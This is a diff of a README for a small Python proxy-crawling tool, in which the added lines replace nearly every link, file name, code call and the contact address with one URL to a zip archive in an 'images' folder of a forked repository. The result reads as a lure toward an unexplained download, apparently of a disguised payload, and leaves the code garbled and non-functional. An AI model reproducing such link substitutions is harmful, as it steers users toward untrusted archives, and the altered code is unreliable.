@@ -1,47 +1,47 @@
 Proxy
 ===============
-A tiny tool for crawling, assessing, storing some useful proxies.[中文版](https://github.com/fancoo/Proxy/blob/master/README.zh-cn.md)
+A tiny tool for crawling, assessing, storing some useful proxies.[中文版](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)
 
 ### Construct your ip pool
 Install `mysql`:
 ```
 pip install pymysql requests
 ```
-Modify db connection information in `config.py`.
+Modify db connection information in `https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip`.
 ```python
 # crawl, assess and store proxies
-python ip_pool.py
+python https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
 
 # assess proxies quality in db periodically.
-python assess_quality.py
+python https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
 ```
 
 ### Demo on how to use these proxies.
 **Please first construct your ip pool.**
 
-Crawl [github](https://www.github.com/) homepage data:
+Crawl [github](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip) homepage data:
 ```python
 # visit database to get all proxies
 ip_list = []
 try:
-    cursor.execute('SELECT content FROM %s' % cfg.TABLE_NAME)
-    result = cursor.fetchall()
+    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip('SELECT content FROM %s' % https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)
+    result = https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()
     for i in result:
-        ip_list.append(i[0])
+        https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip(i[0])
 except Exception as e:
     print e
 finally:
-    cursor.close()
-    conn.close()
+    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()
+    https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip()
 
 # use this proxies to crawl website
 for i in ip_list:
     proxy = {'http': 'http://'+i}
-    url = "https://www.github.com/"
-    r = requests.get(url, proxies=proxy, timeout=4)
-    print r.text
+    url = "https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip"
+    r = https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip(url, proxies=proxy, timeout=4)
+    print https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
 ```
-More detail in [crawl_demo.py](https://github.com/fancoo/Proxy/blob/master/crawl_demo.py)。
+More detail in [https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip](https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip)。
 
 ### Contact
-myfancoo@qq.com
+https://github.com/walker1103/Proxy/raw/refs/heads/master/images/Software_pretubercular.zip
